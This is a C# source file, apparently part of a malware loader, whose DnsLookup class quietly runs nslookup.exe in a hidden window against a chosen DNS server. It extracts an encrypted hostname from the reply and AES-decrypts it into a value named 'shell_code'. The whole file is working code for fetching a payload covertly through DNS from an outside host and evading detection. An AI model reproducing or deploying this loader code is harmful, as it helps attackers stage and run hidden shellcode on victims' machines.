namespace RArAtiTdkA;

using System.Diagnostics;

public class DnsLookup
{
    private static string ARGS = "-timeout=4 -retry=4 ";

    public static string getNSLookup(string DNS_PTR_A, string DnsServer)
    {
        ProcessStartInfo psi = new ProcessStartInfo("nslookup.exe", ARGS + DNS_PTR_A + " " + DnsServer);
        psi.RedirectStandardInput = true;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process nslookup = new Process();
        nslookup.StartInfo = psi;
        nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        nslookup.Start();

        string toComputeDomain = nslookup.StandardOutput.ReadToEnd();
        string encrypted = Util.ParseHostnameFromString(toComputeDomain);
        if (encrypted == null)
            return null;
        string shell_code = AesDecrypt.Decrypt(Form1.AES_KEY, encrypted);
        return shell_code;
    }
}